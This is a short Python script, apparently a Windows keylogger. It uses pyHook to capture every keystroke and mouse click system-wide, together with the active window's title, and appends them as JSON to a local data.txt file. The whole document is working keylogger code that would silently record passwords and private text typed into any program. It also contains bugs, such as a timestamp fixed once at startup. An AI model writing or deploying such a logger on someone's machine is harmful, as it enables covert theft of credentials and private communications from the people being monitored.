from __future__ import print_function

import pyHook
import json
import datetime
instanTime=datetime.datetime.now()
def OnMouseEvent(event):
    Mouse_event_time_details = "{}.{}.{} - D-Y-M - {}:{}:{} H-M-S".format(instanTime.day, instanTime.month,
                                                                          instanTime.year,
                                                                          instanTime.hour, instanTime.minute,
                                                                          instanTime.second)
    MouseData={
        "MessageName":event.MessageName,
        "MouseMessage":event.Message,
        "DetailTime":Mouse_event_time_details,
        "Window":event.Window,
        "WindowName":event.WindowName,
        "MousePosition":event.Position,
        "Wheel":event.Wheel,
        "ınjected":event.Injected

    }
    try:
        with open('data.txt', 'a') as f:
            f.write("\n")
            json.dump(MouseData,f)
    except IOError:
        print("bir hata oluştu!")
    finally:
        f.close()

    return True

def OnKeyboardEvent(event):
    event_time_details = "{}.{}.{} - D-Y-M - {}:{}:{} H-M-S".format(instanTime.day, instanTime.month, instanTime.year,
                                                                    instanTime.hour, instanTime.minute,
                                                                    instanTime.second)
    keyboardData = {
        "MessageName": event.MessageName,
        "MouseMessage": event.Message,
        "DetailTime": event_time_details,
        "Window": event.Window,
        "WindowName": event.WindowName,
        "Ascıı":event.Ascii,
        "Key": event.Key,
        "ScanCode":event.ScanCode,
        "Extended":event.Extended,
        "ınjected": event.Injected,
        "Alt":event.Alt,
        "Transition":event.Transition

    }
    try:
        with open('data.txt', 'a') as f:
            f.write("\n")
            json.dump(keyboardData,f)
    except IOError:
        print("bir hata oluştu!")
    finally:
        f.close()

    return True


hm = pyHook.HookManager()

hm.MouseAllButtonsDown = OnMouseEvent
hm.KeyDown = OnKeyboardEvent


hm.HookMouse()
hm.HookKeyboard()

if __name__ == '__main__':
    import pythoncom
    pythoncom.PumpMessages()